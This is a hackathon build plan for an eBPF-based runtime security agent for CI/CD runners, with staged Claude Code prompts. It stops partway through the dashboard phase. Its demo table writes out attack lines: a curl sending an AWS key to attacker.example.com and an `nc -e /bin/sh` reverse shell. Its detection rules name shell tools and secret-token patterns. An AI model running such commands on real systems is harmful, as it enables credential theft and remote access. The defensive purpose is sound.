# 🏛️ Citadel — 24-Hour Hackathon Build Plan

**Project name:** Citadel **Tagline:** Runtime EDR for CI/CD runners **Mission:** Prevent exfiltration. Detect anomalies. Catch tampering. **Time budget:** 24 hours **Strategy:** Three attack scenarios → three goals → one platform. Build the demo backwards.

---

## Part 1 — Strategy

### One-sentence pitch

Citadel is a runtime security agent that sits inside CI/CD runners using eBPF to watch every syscall, network connection, and file write — detecting and blocking supply-chain attacks before they reach production.

### The three demos that win the hackathon

Citadel has three goals. Each gets one live demo:

| \# | Goal | Attack we show | What Citadel does |
| :---- | :---- | :---- | :---- |
| 1 | **Prevent Exfiltration** | Malicious action `curl`s `$AWS_KEY` to `attacker.example.com` | Detects the connection, blocks it via eBPF, shows the full process tree that initiated it |
| 2 | **Anomaly Detection** | Compromised dep spawns `nc -e /bin/sh attacker:4444` (reverse shell) | Flags the shell-from-build-tool process chain, kills the process |
| 3 | **Detect Tampering** | Step writes `// backdoor` into `src/index.js` mid-build | Detects source file modification after checkout, alerts with diff |

If you nail all three demos, you win. If you nail two, you still win. If only one works on demo day, you have a story.

### Final architecture

┌─ Self-hosted Linux Runner (Ubuntu 22.04, kernel 5.15+) ─────────────┐

│                                                                       │

│  Docker container: ghcr.io/\<you\>/citadel-agent:latest                 │

│  ┌──────────────────────────────────────────────────────────────┐    │

│  │ Citadel Agent (Go, runs as root, \--privileged)                │    │

│  │  ┌──────────────────────────────────────────────────────┐    │    │

│  │  │ eBPF Programs (C, compiled to .o, loaded via         │    │    │

│  │  │   github.com/cilium/ebpf with bpf2go codegen)         │    │    │

│  │  │  • net.bpf.c    → kprobe tcp\_connect, tcp\_v4\_connect │    │    │

│  │  │  • proc.bpf.c   → tracepoint sched\_process\_exec       │    │    │

│  │  │  • file.bpf.c   → tracepoint sys\_enter\_openat (write) │    │    │

│  │  │  • block.bpf.c  → cgroup\_skb/egress (block mode only) │    │    │

│  │  └────────────────────────┬─────────────────────────────┘    │    │

│  │                            │ ringbuffer                       │    │

│  │  ┌─────────────────────────▼────────────────────────────┐    │    │

│  │  │ Go event pipeline                                     │    │    │

│  │  │  • Reads ringbuffers (3 goroutines)                   │    │    │

│  │  │  • Resolves PIDs → process tree → workflow step      │    │    │

│  │  │  • Resolves IPs → domains via reverse cache          │    │    │

│  │  │  • Tags with GITHUB\_\* metadata                        │    │    │

│  │  │  • Batches and POSTs to backend                       │    │    │

│  │  └────────────────────────┬─────────────────────────────┘    │    │

│  └────────────────────────────│─────────────────────────────────┘    │

│                                │ HTTPS                                │

└────────────────────────────────│──────────────────────────────────────┘

                                 │

                ┌────────────────▼────────────────┐

                │ Citadel Backend (Go \+ SQLite)   │

                │  • POST /api/events             │

                │  • GET  /api/runs, /detections  │

                │  • POST /api/detections         │

                └────────────────┬────────────────┘

                                 │

                ┌────────────────▼────────────────┐

                │ Citadel Detector (Python)       │

                │  • Pulls new events every 2s    │

                │  • Builds per-job baseline      │

                │  • Runs detection rules:        │

                │    \- New domain                 │

                │    \- Suspicious process chain   │

                │    \- File modified post-checkout│

                │    \- Token-pattern in payload   │

                │    \- Reverse-shell heuristic    │

                │  • POSTs detections back        │

                └────────────────┬────────────────┘

                                 │

                ┌────────────────▼────────────────┐

                │ Citadel Dashboard (Next.js)     │

                │  • Runs list                    │

                │  • Run detail: 3 tabs           │

                │    Network · Process · Files    │

                │  • Detections panel             │

                │  • Policy editor                │

                └─────────────────────────────────┘

### Tech stack — final

| Layer | Choice | Why |
| :---- | :---- | :---- |
| eBPF programs | **C, libbpf-style, compiled with clang** | The standard. CO-RE-portable via `vmlinux.h`. |
| eBPF loader | **`github.com/cilium/ebpf` \+ `bpf2go`** | Pure-Go userspace, no CGO. Generates Go bindings from C source. |
| Agent | **Go 1.22** | Single static binary, great concurrency for ringbuffer readers |
| Detector | **Python 3.11 \+ FastAPI \+ httpx** | Fast iteration on detection rules, easy to demo |
| Backend | **Go \+ chi \+ modernc.org/sqlite** | Pure-Go SQLite, one binary, no setup |
| Dashboard | **Next.js 14 \+ Tailwind \+ lucide-react** | Fastest path to a polished UI |
| Packaging | **Docker multi-stage \+ docker-compose** | Reproducible, demo-friendly |
| CI integration | **Composite GitHub Action** | Just YAML \+ bash, no JS build needed |
| Runner | **Self-hosted Ubuntu 22.04 VM, kernel ≥ 5.15** | Required for modern eBPF (ringbuf, CO-RE, cgroup\_skb) |

### 24-hour timeline at a glance

| Phase | What | Time | Cumulative |
| :---- | :---- | :---- | :---- |
| 0 | Foundation: runner, repo, Dockerfiles, smoke test | 1h | 1:00 |
| 1 | eBPF \#1 — Network probe (tcp\_connect) | 3h | 4:00 |
| 2 | eBPF \#2 — Process probe (sched\_process\_exec) | 2h | 6:00 |
| 3 | eBPF \#3 — File probe (openat write) | 2h | 8:00 |
| 4 | Go agent — event pipeline \+ enrichment | 2h | 10:00 |
| 5 | Backend ingestion | 1h 30m | 11:30 |
| 6 | Python detector \+ baseline \+ rules | 3h | 14:30 |
| 7 | Dashboard | 2h 30m | 17:00 |
| 8 | Policy engine \+ block mode | 2h 30m | 19:30 |
| 9 | GitHub Action \+ Docker packaging | 1h 30m | 21:00 |
| 10 | Three attack demos \+ polish \+ recording | 3h | 24:00 |

### Pre-flight checklist (do BEFORE the clock starts)

- [ ] Ubuntu 22.04 VM (8GB RAM, kernel ≥ 5.15, `uname -r` to check) with sudo  
- [ ] Install: `sudo apt install -y clang llvm libelf-dev libbpf-dev linux-headers-$(uname -r) make pkg-config build-essential docker.io`  
- [ ] Install Go 1.22+, Node 20+, Python 3.11+  
- [ ] `sudo systemctl disable --now systemd-resolved` (we'll handle DNS ourselves)  
- [ ] GitHub repo \+ self-hosted runner registered with label `citadel-runner`  
- [ ] Passwordless sudo for runner user (`sudo -n true` succeeds)  
- [ ] Second VM or webhook.site URL as the "attacker" exfil target  
- [ ] Claude Code authenticated and tested  
- [ ] Generate `vmlinux.h` once and commit it: `bpftool btf dump file /sys/kernel/btf/vmlinux format c > bpf/vmlinux.h`  
- [ ] This document open in a tab

**eBPF reality check:** If you've never written eBPF before, do the [cilium/ebpf getting started example](https://ebpf-go.dev/guides/getting-started/) in the 30 minutes before the timer starts. It will save you 2 hours during the build.

---

## Part 2 — Phases

### Phase 0 — Foundation (1h)

**Problem:** We need scaffolding for a multi-service project, Docker baseline, and a known-working runner before any real work begins.

**Sub-problems:**

- 0.1 Monorepo layout for 4 services \+ action \+ examples  
- 0.2 Base Dockerfile that can build/run a Go binary with eBPF (`--privileged`, kernel headers, libbpf)  
- 0.3 docker-compose.yml for local dev (backend \+ detector \+ dashboard)  
- 0.4 A baseline "victim CI" workflow that runs on the self-hosted runner

**Tech:** Git, Docker, bash, GitHub Actions YAML

**Claude Code prompts:**

**Prompt 0.1 — Monorepo scaffold** Create a monorepo for a project called `citadel` (an EDR-like runtime security layer for CI/CD runners). Create these directories with README.md placeholders explaining the purpose of each:

- `/agent` — Go binary \+ eBPF C programs, runs inside the runner  
- `/agent/bpf` — eBPF C source files (net.bpf.c, proc.bpf.c, file.bpf.c, block.bpf.c) and vmlinux.h  
- `/backend` — Go HTTP API \+ SQLite for event storage  
- `/detector` — Python FastAPI service for detection rules and baseline learning  
- `/dashboard` — Next.js 14 dashboard  
- `/action` — Composite GitHub Action that wraps the agent  
- `/examples` — sample workflows: victim-ci.yml, attack-1-exfil.yml, attack-2-revshell.yml, attack-3-tamper.yml  
- `/docs` — architecture notes, demo script, threat model

At the repo root, create:

- `README.md` with project name, tagline ("Runtime EDR for CI/CD runners"), goals, and architecture diagram (ASCII)  
- `Makefile` with stub targets: `build-agent`, `build-backend`, `build-detector`, `build-dashboard`, `docker-build`, `docker-up`, `docker-down`, `demo-reset`  
- `.gitignore` covering Go, Node, Python, eBPF object files (.o), and SQLite files

**Prompt 0.2 — Agent base Dockerfile** Create `/agent/Dockerfile` as a multi-stage build:

- Stage 1 (builder): `ubuntu:22.04` base, install clang-14, llvm, libelf-dev, libbpf-dev, linux-headers, golang 1.22, build-essential. Copy the agent source. Run `make bpf` (compiles C BPF programs to .o) then `make build` (builds the Go binary which embeds the .o files via `bpf2go`).  
- Stage 2 (runtime): `ubuntu:22.04` base, install only libelf1 and ca-certificates. Copy the agent binary from builder. Default CMD runs the agent. Note in a comment that the container must run with `--privileged` and `--pid=host` for eBPF access.

Create `/agent/Makefile` with targets:

- `bpf`: compiles each `.bpf.c` in `/agent/bpf` with `clang -O2 -g -target bpf -c $< -o $@` (output to `/agent/bpf/build/*.o`)  
- `build`: runs `go generate ./...` (for bpf2go) then `go build -o bin/citadel-agent ./cmd/agent`  
- `clean`: removes build artifacts

**Prompt 0.3 — docker-compose for dev** Create `/docker-compose.yml` with three services:

- `backend`: builds from `./backend/Dockerfile`, exposes 8080, mounts a volume for SQLite at `/data`  
- `detector`: builds from `./detector/Dockerfile`, depends\_on backend, env `BACKEND_URL=http://backend:8080`  
- `dashboard`: builds from `./dashboard/Dockerfile`, exposes 3000, env `NEXT_PUBLIC_BACKEND_URL=http://localhost:8080`

Note: the agent does NOT run in compose — it runs directly on the runner VM (or as a separate `docker run --privileged` command) because it needs host-level eBPF access.

Add `make docker-up` and `make docker-down` targets in root Makefile.

**Prompt 0.4 — Victim CI workflow** In `/examples`, create `victim-ci.yml` — a normal-looking workflow on self-hosted runner labeled `citadel-runner`:

- Triggers on push and workflow\_dispatch  
- One job `build` with steps: checkout, setup-node@v4, `npm install` (using a small package.json with chalk and lodash), `npm test` (just `echo "tests passed"`), `npm run build` (just `echo "build done"`)

Also create `/examples/package.json`, `/examples/index.js`, and a `/examples/test.js` to make the workflow actually run.

**Acceptance:** `make docker-up` brings backend \+ detector \+ dashboard up. The victim workflow runs successfully on your self-hosted runner. `make build-agent` compiles even without eBPF code yet (empty stubs are fine).

---

### Phase 1 — eBPF \#1: Network Probe (3h)

**Problem:** We need to see every outbound TCP connection from any process inside the runner, regardless of language, library, or DNS resolution. This is the foundation of exfiltration detection.

**Sub-problems:**

- 1.1 An eBPF C program attached to `kprobe/tcp_v4_connect` that captures pid, comm, dst\_ip, dst\_port  
- 1.2 A ringbuffer to stream events to userspace  
- 1.3 Go userspace loader using cilium/ebpf \+ bpf2go codegen  
- 1.4 Pretty-print events to stdout for verification

**Tech:** eBPF C (libbpf-style, CO-RE), `clang -target bpf`, `github.com/cilium/ebpf/cmd/bpf2go`

**Claude Code prompts:**

**Prompt 1.1 — eBPF network program** Create `/agent/bpf/net.bpf.c` — a CO-RE-portable eBPF program. Structure:

- Includes: `"vmlinux.h"`, `<bpf/bpf_helpers.h>`, `<bpf/bpf_tracing.h>`, `<bpf/bpf_core_read.h>`  
- Define a `struct net_event` with fields: `u32 pid`, `u32 ppid`, `u32 uid`, `char comm[16]`, `u32 saddr`, `u32 daddr`, `u16 dport`, `u64 ts_ns`  
- Define a `BPF_MAP_TYPE_RINGBUF` map named `net_events` with `max_entries = 256 * 1024`  
- Define a kprobe attached to `tcp_v4_connect`:  
  - Read `pid_tgid`, split into pid and tgid  
  - Read `current->real_parent->tgid` for ppid using `BPF_CORE_READ`  
  - Read `bpf_get_current_comm`  
  - From the second arg (a `struct sockaddr *`), CO-RE-read the dst IP and dst port (`sockaddr_in.sin_addr.s_addr`, `sockaddr_in.sin_port` — remember port is network-byte-order)  
  - Reserve a `net_event` from the ringbuf, fill it, submit  
- License: `char LICENSE[] SEC("license") = "GPL";`

Add a comment block at top explaining what each section does — this is reference code we'll come back to.

**Prompt 1.2 — Go userspace loader (network)** Create `/agent/internal/probes/net/net.go`:

- Use `bpf2go` directive: `//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang -cflags "-O2 -g -Wall" -target amd64 NetProbe ../../bpf/net.bpf.c -- -I../../bpf`  
- Export a `NetProbe` struct with methods:  
  - `Load() error` — calls generated `loadNetProbeObjects`, attaches the kprobe via `link.Kprobe("tcp_v4_connect", objs.HandleTcpConnect, nil)`  
  - `Events() <-chan NetEvent` — returns a channel of parsed events from the ringbuffer (use `ringbuf.NewReader`)  
  - `Close()` — detaches everything, closes the ringbuf  
- `NetEvent` struct (Go side) has: PID, PPID, UID, Comm string, DstIP net.IP, DstPort uint16, Timestamp time.Time  
- Convert raw u32 dst\_ip to `net.IP` (handle byte order). Convert dport from network to host byte order.

Also create `/agent/cmd/agent/main.go` that loads the NetProbe and prints every event as JSON to stdout. No backend yet.

**Prompt 1.3 — Smoke test** Add a `make net-smoke-test` target in `/agent/Makefile`:

1. Compile bpf \+ Go binary  
2. Run binary in background with `sudo`  
3. Sleep 1s  
4. Run `curl -s https://github.com > /dev/null` and `curl -s https://registry.npmjs.org > /dev/null`  
5. Capture agent output for 3 seconds, then kill it  
6. Assert output contains "github.com" or the resolved IP (we'll add reverse DNS later — for now grep for the IP that github.com resolves to)  
7. Print PASS/FAIL with the captured events

**Prompt 1.4 — Reverse DNS cache** Add `/agent/internal/dns/cache.go` — a small DNS reverse-lookup cache:

- `type Cache struct` with sync.RWMutex \+ map\[string\]string (ip → hostname)  
- `Lookup(ip net.IP) string` — checks cache; if miss, does `net.LookupAddr(ip.String())`, stores first result, returns it. Empty string on failure.  
- TTL of 5 minutes (don't bother with proper expiry, just track timestamp per entry and re-lookup on access if expired)  
- Pre-populate by sniffing DNS responses? Skip that complexity — just use reverse DNS for the hackathon. Note this limitation in a code comment.

Wire into the agent main: enrich each `NetEvent` with `Hostname` field before logging.

**Acceptance:** `make net-smoke-test` prints PASS. Manually run `sudo ./bin/citadel-agent`, then in another terminal `curl https://github.com` — agent prints a JSON event with `pid`, `comm: "curl"`, `dst_ip`, `dport: 443`, and `hostname: "github.com"` (or similar).

---

### Phase 2 — eBPF \#2: Process Probe (2h)

**Problem:** Process events tell us *which process* did anything else we observe. They also enable anomaly detection (reverse shells, unexpected binaries spawned during build).

**Sub-problems:**

- 2.1 eBPF program on `tracepoint:sched/sched_process_exec` capturing exec events  
- 2.2 Capture full argv (best effort — at least argv\[0..2\])  
- 2.3 Capture parent PID for process-tree reconstruction  
- 2.4 Userspace process-tree builder

**Tech:** eBPF tracepoint, same toolchain as Phase 1

**Claude Code prompts:**

**Prompt 2.1 — eBPF process program** Create `/agent/bpf/proc.bpf.c`:

- Define `struct proc_event` with: `u32 pid`, `u32 ppid`, `u32 uid`, `char comm[16]`, `char filename[128]`, `char args[256]`, `u64 ts_ns`  
- Define a ringbuffer `proc_events`  
- Attach to `tracepoint/sched/sched_process_exec`:  
  - Read the tracepoint's `unsigned int filename` offset (in ctx) — use `BPF_CORE_READ_STR_INTO` to read the filename string  
  - Get current pid/ppid/uid via helpers  
  - Get comm via `bpf_get_current_comm`  
  - For args, read `current->mm->arg_start` and `arg_end`, then `bpf_probe_read_user_str` up to 256 bytes  
  - Submit to ringbuf  
- License: GPL

Reference the `sched_process_exec` tracepoint format: `cat /sys/kernel/debug/tracing/events/sched/sched_process_exec/format`

**Prompt 2.2 — Go userspace loader (process)** Create `/agent/internal/probes/proc/proc.go`:

- bpf2go directive for `ProcProbe` generated from `proc.bpf.c`  
- `ProcProbe` struct with `Load()`, `Events() <-chan ProcEvent`, `Close()`  
- Attach via `link.Tracepoint("sched", "sched_process_exec", ...)`  
- `ProcEvent` Go struct: PID, PPID, UID, Comm, Filename, Args (string slice — split on null bytes), Timestamp

Update `/agent/cmd/agent/main.go` to also load ProcProbe and print proc events alongside net events.

**Prompt 2.3 — Process tree** Create `/agent/internal/proctree/tree.go`:

- In-memory cache of recent processes: `map[uint32]*ProcessInfo` keyed by PID with fields PID, PPID, Comm, Args, StartTime  
- `Add(event ProcEvent)` — stores a process  
- `Ancestry(pid uint32) []ProcessInfo` — returns the chain from pid up to PID 1 (or until unknown)  
- `Find(pid uint32) *ProcessInfo` — single lookup  
- Concurrency-safe (sync.RWMutex)  
- Cleanup old entries after 1 hour (lazy on Add)

Wire into agent main: on every NetEvent, look up the process and attach `Ancestry` to the enriched event. So a single network call results in a payload like `{dst: github.com:443, process_chain: ["bash", "npm", "node", "curl"]}`.

**Acceptance:** Run the agent, then in another terminal: `bash -c "npm --version"`. Agent logs the exec of bash → sh → npm → node with the full process chain.

---

### Phase 3 — eBPF \#3: File Probe (2h)

**Problem:** Detect when source files in the workspace are modified during the build phase by unexpected processes. This is the basis of tampering detection.

**Sub-problems:**

- 3.1 eBPF program on `tracepoint:syscalls/sys_enter_openat` filtering write/create flags  
- 3.2 Capture full path (within the 256-byte limit of BPF stack)  
- 3.3 Workspace-only filter in userspace (paths under `/home/runner/work/`)  
- 3.4 Optionally compute SHA256 of written file in userspace for tampering proof

**Tech:** eBPF tracepoint, openat flags (O\_WRONLY, O\_RDWR, O\_CREAT)

**Claude Code prompts:**

**Prompt 3.1 — eBPF file program** Create `/agent/bpf/file.bpf.c`:

- Define `struct file_event` with: `u32 pid`, `u32 ppid`, `u32 uid`, `char comm[16]`, `char filename[256]`, `s32 flags`, `u64 ts_ns`  
- Ringbuffer `file_events`  
- Attach to `tracepoint/syscalls/sys_enter_openat`:  
  - Read `flags` from ctx (the second arg in openat is flags)  
  - Filter: only emit if `flags & (O_WRONLY | O_RDWR | O_CREAT)` is set — write/create intent. Use the actual numeric values: `O_WRONLY=1, O_RDWR=2, O_CREAT=64`. Add as `#define` constants in the file.  
  - Read the `filename` argument (a user-space pointer) into the event using `bpf_probe_read_user_str`  
  - Emit to ringbuf  
- License: GPL

Comment explains the openat syscall signature: `int openat(int dirfd, const char *pathname, int flags, mode_t mode)`.

**Prompt 3.2 — Go userspace loader (file)** Create `/agent/internal/probes/file/file.go`:

- bpf2go for `FileProbe`  
- `FileProbe` with the standard `Load/Events/Close` API  
- `FileEvent` Go struct: PID, PPID, UID, Comm, Filename, Flags (parsed into human-readable like "WRONLY|CREAT"), Timestamp  
- In `Events()`, filter out filenames that don't match a configurable prefix (default: `/home/runner/work/`, settable via env `CITADEL_WATCH_PATH`)  
- Skip `/proc/`, `/sys/`, `/tmp/`, and the agent's own files — too noisy

Wire into agent main alongside net \+ proc probes.

**Prompt 3.3 — Source baseline (post-checkout snapshot)** Create `/agent/internal/integrity/baseline.go`:

- `Snapshot(rootDir string) (map[string]string, error)` — walks rootDir, computes SHA256 of every regular file, returns `path → sha256`  
- `Diff(before, after map[string]string) []FileDiff` — returns `[{Path, OldHash, NewHash, Action: "modified"|"added"|"deleted"}]`  
- Called by the GitHub Action: after `actions/checkout`, snapshot the workspace. At end of job (or on demand), re-snapshot and diff.

Wire a CLI subcommand: `citadel-agent snapshot --path /home/runner/work/... --out /tmp/citadel-baseline.json` and `citadel-agent diff --before /tmp/citadel-baseline.json --after-path /path/to/workspace`. The diff output is also emitted as events (`type=file_tamper`) to the backend.

**Acceptance:** Run agent. In another terminal: `echo 'x' >> /home/runner/work/test.txt`. Agent emits a file\_event with comm=bash, filename matches, flags include WRONLY. Snapshot diff correctly identifies the modification.

---

### Phase 4 — Go Agent: Event Pipeline (2h)

**Problem:** We have three probe sources emitting raw events. We need to merge, enrich, batch, and ship them with workflow metadata.

**Sub-problems:**

- 4.1 Unified `Event` type that can hold net/proc/file events  
- 4.2 Enrichment: process tree \+ reverse DNS \+ workflow metadata  
- 4.3 Batching \+ retry HTTP client to backend  
- 4.4 Graceful shutdown (drain queues, detach probes)

**Tech:** Go, channels, `context.Context`, exponential-backoff retry

**Claude Code prompts:**

**Prompt 4.1 — Unified event schema** Create `/agent/internal/events/event.go`:

- `type Event struct` with: `ID string` (uuid), `Type string` ("network"|"process"|"file"|"file\_tamper"|"detection"), `Timestamp time.Time`, `Network *NetData`, `Process *ProcessData`, `File *FileData`, `ProcessChain []string`, `WorkflowMeta WorkflowMeta`  
- `NetData`: SrcIP, DstIP, DstPort, Hostname, Process (name)  
- `ProcessData`: PID, PPID, UID, Comm, Filename, Args  
- `FileData`: Path, Flags, OldHash, NewHash, Action  
- `WorkflowMeta`: Repository, Workflow, WorkflowFile, RunID, RunNumber, SHA, Ref, Actor, EventName, Job, Step  
- JSON tags throughout (snake\_case)

Add a constructor `NewFromNetEvent(NetEvent, *proctree.Tree, *dns.Cache, WorkflowMeta) Event` and similar for process/file events.

**Prompt 4.2 — Workflow metadata loader** Create `/agent/internal/workflow/meta.go`:

- `Load(metaFile string) (WorkflowMeta, error)` — reads `/tmp/citadel-meta.json` (written by the GitHub Action), parses into struct  
- Also read live env vars as fallback (`GITHUB_WORKFLOW`, `GITHUB_JOB`, etc.)  
- `CurrentStep() string` — reads `/tmp/citadel-current-step` (a sentinel file the action wrapper updates between steps); returns empty if not present  
- Cached with 500ms refresh interval — don't hammer the filesystem

**Prompt 4.3 — Backend client with batching** Create `/agent/internal/backend/client.go`:

- `Client` struct with backend URL, HTTP client, an internal channel `queue chan Event` (buffered, capacity 10000), and a stop signal  
- `Start(ctx context.Context)` — launches a goroutine that reads from queue, batches up to 100 events or 2 seconds (whichever first), POSTs to `/api/events`. Retries 3x with exponential backoff (1s, 2s, 4s). On final failure, log and drop (don't block).  
- `Send(e Event)` — non-blocking send to queue (uses `select` with default case for overflow protection, logs warning if dropping)  
- `Stop()` — closes queue, waits for drain (with 5s timeout), then returns

**Prompt 4.4 — Main agent wiring** Rewrite `/agent/cmd/agent/main.go` to be the production entrypoint:

- Flags: `--backend-url`, `--mode` (audit/block), `--policy` (path), `--meta-file`, `--watch-path` (workspace root)  
- Sets up signal context for graceful shutdown  
- Loads all three probes (net, proc, file)  
- Starts backend client batcher  
- Main loop: select over the three Events() channels, enrich each event, send to backend client  
- On SIGINT/SIGTERM: cancel context, stop probes, stop backend client (drain), then exit  
- Structured logging via `slog`, writes to both stderr and `/var/log/citadel-agent.log`

**Acceptance:** Run agent, trigger the victim workflow, see batched events arriving at the backend (we'll build that next). For now just hit a `nc -l 8080` and confirm POSTs are made.

---

### Phase 5 — Backend Ingestion (1h 30m)

**Problem:** A reliable place to store events, expose them via REST for the detector and dashboard. Must be simple — SQLite is fine for a hackathon.

**Sub-problems:**

- 5.1 Schema: runs, events, detections, policies  
- 5.2 Ingest endpoint  
- 5.3 Read endpoints (runs list, run detail, detections)  
- 5.4 Detection write endpoint (for the Python detector to call)

**Tech:** Go, chi, modernc.org/sqlite (pure-Go, no CGO)

**Claude Code prompts:**

**Prompt 5.1 — Backend skeleton \+ schema** In `/backend`, init a Go module. Use `github.com/go-chi/chi/v5`, `modernc.org/sqlite`, `github.com/google/uuid`.

Create:

- `cmd/backend/main.go` — listens on `:8080`, flag `--db-path`  
- `internal/db/db.go` — opens SQLite, runs embedded migrations  
- `internal/db/migrations/001_init.sql`:  
  - `runs` (id PK, repository, workflow, run\_id, run\_number, sha, ref, actor, started\_at, policy\_mode, status)  
  - `events` (id PK, run\_id FK, type, timestamp, payload JSON (full event), process\_chain JSON, step)  
  - `detections` (id PK, run\_id FK, event\_id FK nullable, rule\_name, severity, message, created\_at)  
  - `policies` (id PK, name, scope\_repo, scope\_workflow, mode, allowlist JSON, detection\_rules JSON, updated\_at)  
- Index on `events(run_id)`, `detections(run_id)`  
- `internal/api/router.go` with `/healthz` returning 200 OK  
- CORS middleware permitting `http://localhost:3000`

**Prompt 5.2 — Event ingest** Add `POST /api/events` handler:

- Body: `{"events": [...full Event JSON from agent...]}`  
- For each event: upsert the run keyed on `(repository, run_id)`. Insert the event with `run_id` FK.  
- Transactional. Return `{"accepted": N}`.  
- Handle batches up to 1000\.

**Prompt 5.3 — Read endpoints** Add:

- `GET /api/runs?limit=50` — recent runs with counts: `[{id, repo, workflow, run_id, sha, started_at, policy_mode, event_counts: {network, process, file}, detection_count, severity_max}]`  
- `GET /api/runs/:id` — single run with `{run, events: [...], detections: [...]}`. Allow `?type=network` to filter events.  
- `GET /api/runs/:id/process-tree` — reconstruct process tree from process events: returns nested JSON tree  
- `GET /api/runs/:id/baseline-domains` — distinct hostnames from network events in this run  
- `GET /api/detections?since=ISO_TIME` — detections newer than timestamp (for detector polling-back)

**Prompt 5.4 — Detection write \+ policy CRUD** Add:

- `POST /api/detections` — body: `{run_id, event_id?, rule_name, severity, message}`. Severity is one of `info|low|medium|high|critical`. Inserts detection.  
- `GET /api/policies` and `POST /api/policies` — CRUD for policy YAML/JSON. Store as JSON in DB. Used by the dashboard policy editor.  
- `GET /api/policies/applicable?repo=X&workflow=Y` — returns the most specific policy that applies, using precedence (workflow \> repo \> org \> default). For hackathon, just match repo+workflow exactly; fall back to a hardcoded permissive default if none.

**Acceptance:** `curl localhost:8080/healthz` returns OK. Send a sample event payload with `curl -X POST` → it appears in `GET /api/runs/...`.

---

### Phase 6 — Python Detector (3h)

**Problem:** Real detection logic. The Go agent is dumb on purpose — it streams raw events. The detector is where we get to be clever: baselines, anomaly rules, severity scoring.

**Sub-problems:**

- 6.1 Polling consumer loop (pull events from backend every 2s)  
- 6.2 Baseline builder (per-job whitelist of domains, processes, file paths)  
- 6.3 Rule: new outbound domain not in baseline  
- 6.4 Rule: reverse-shell process chain heuristic  
- 6.5 Rule: source file modified after checkout step  
- 6.6 Rule: process exec'd from /tmp or non-standard path  
- 6.7 Optional: token/secret pattern matching in network data

**Tech:** Python 3.11, FastAPI (for optional webhook endpoint), httpx, sqlite3 (read-only mirror or just pull via API)

**Claude Code prompts:**

**Prompt 6.1 — Detector scaffold** In `/detector`, create a Python project:

- `pyproject.toml` with deps: fastapi, uvicorn, httpx, pyyaml, python-dateutil  
- `app/main.py` — FastAPI app with `/healthz` and `/stats` endpoints  
- `app/client.py` — backend client class: `fetch_new_events(since: datetime) -> list[Event]`, `post_detection(detection: Detection)`  
- `app/models.py` — pydantic models matching the Go Event schema  
- `app/worker.py` — async worker that polls every 2 seconds, calls into rule engine, posts detections back  
- `Dockerfile`: python:3.11-slim base, install deps, run `uvicorn app.main:app --host 0.0.0.0 --port 8000` AND start the worker in the background (use a startup hook)

Backend URL via env `BACKEND_URL`. Poll interval via env `POLL_INTERVAL_SECONDS` (default 2).

**Prompt 6.2 — Baseline builder** Create `/detector/app/baseline.py`:

- `class Baseline` with persisted state (JSON on disk at `/data/baseline.json`)  
- Key: `(repository, workflow, job)`. Value: `{domains: set, processes: set, file_writes: set, runs_seen: int}`  
- `update(event: Event)` — adds the event's domain/process/path to the appropriate set  
- `is_known_domain(repo, workflow, job, domain) -> bool`  
- `is_known_process(repo, workflow, job, comm) -> bool`  
- `is_known_file(repo, workflow, job, path) -> bool`  
- `status(repo, workflow, job) -> str` — returns "creating" (runs\_seen \< 3), "stable" (runs\_seen \>= 3 and no recent flux), "unstable" (heuristic: \> 10 new endpoints in last 3 runs)  
- Wildcard expansion: when storing `xyz.docker.io`, also store the wildcard `*.docker.io` for the purpose of `is_known_domain` matching (cheap glob)

Hook into the worker so every processed event updates the baseline AFTER rules run on it.

**Prompt 6.3 — Detection rules** Create `/detector/app/rules/` package with one file per rule:

`rules/new_domain.py` — `NewDomainRule`:

- On a network event: if baseline status is "stable" AND domain is not known → emit detection: severity="medium", rule\_name="new\_outbound\_domain", message="Unexpected domain X contacted by process Y in step Z"

`rules/reverse_shell.py` — `ReverseShellRule`:

- Heuristic: a process whose `comm` is in `{"sh", "bash", "nc", "ncat", "socat", "python", "perl", "ruby"}` is exec'd AND its parent is one of `{"node", "npm", "yarn", "make", "gcc"}` (i.e., a build tool spawning a shell) → severity="high", rule\_name="suspicious\_shell\_spawn"  
- Also: any process that has both a network event (outbound) AND spawns `/bin/sh`\-like child within 1 second → severity="critical", rule\_name="possible\_reverse\_shell"

`rules/source_tamper.py` — `SourceTamperRule`:

- On a file event with path under `$GITHUB_WORKSPACE` AND timestamp is AFTER the checkout step AND BEFORE any test/build/deploy step: emit detection: severity="high", rule\_name="source\_modified\_after\_checkout"

`rules/suspicious_exec.py` — `SuspiciousExecRule`:

- Process exec'd from `/tmp/`, `/dev/shm/`, or `/var/tmp/`: severity="high", rule\_name="exec\_from\_temp"  
- Process named `curl` or `wget` whose ancestry includes a non-CI process not in `{git, npm, node, ...}`: severity="medium", rule\_name="suspicious\_downloader"

`rules/token_in_payload.py` — `TokenInPayloadRule`:

- For network events, if any captured argv or comm contains regex `(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|xox[bp]-[A-Za-z0-9-]+)`: severity="critical", rule\_name="secret\_in\_network\_payload"

Each rule is a class with `evaluate(event, context) -> Detection | None`. The worker runs every event through every rule.

**Prompt 6.4 — Wire it all together** In `/detector/app/worker.py`:

- `RuleEngine` class instantiates all rules and runs them on each event  
- Worker loop:  
  1. Fetch new events since `last_seen_ts` (track in memory \+ persist to `/data/state.json`)  
  2. For each event: enrich with run context (cache run metadata in memory), run all rules, collect detections  
  3. POST each detection to backend  
  4. Update baseline with the event  
  5. Sleep `POLL_INTERVAL_SECONDS`  
- Add structured logging — one log line per detection emitted

**Acceptance:** Trigger an attack workflow → detector logs detections → dashboard's detections endpoint returns them. Test each rule with a synthetic event payload.

---

### Phase 7 — Dashboard (2h 30m)

**Problem:** The judges' first impression is the dashboard. It needs to be fast, opinionated, and obviously valuable in 30 seconds.

**Sub-problems:**

- 7.1 Next.js scaffold, navbar, theming  
- 7.2 Runs list page  
- 7.3 Run detail page with 3 tabs (Network, Processes, Files) \+ Detections sidebar  
- 7.4 Process tree visualization  
- 7.5 Policy editor page

**Tech:** Next.js 14 App Router, Tailwind, lucide-react, optional `react-flow` for process tree

**Claude Code prompts:**

**Prompt 7.1 — Dashboard scaffold \+ theme** In `/dashboard`, scaffold Next.js 14 with App Router, TypeScript, Tailwind:

npx create-next-app@latest . \--typescript \--tailwind \--app \--no-src-dir \--import-alias "@/\*"

Add `lucide-react`. Create:

- `lib/api.ts` — typed client with `fetchRuns()`, `fetchRun(id)`, `fetchProcessTree(id)`, `fetchDetections(since?)`, `fetchPolicies()`, `savePolicy(p)`. Use `NEXT_PUBLIC_BACKEND_URL`.  
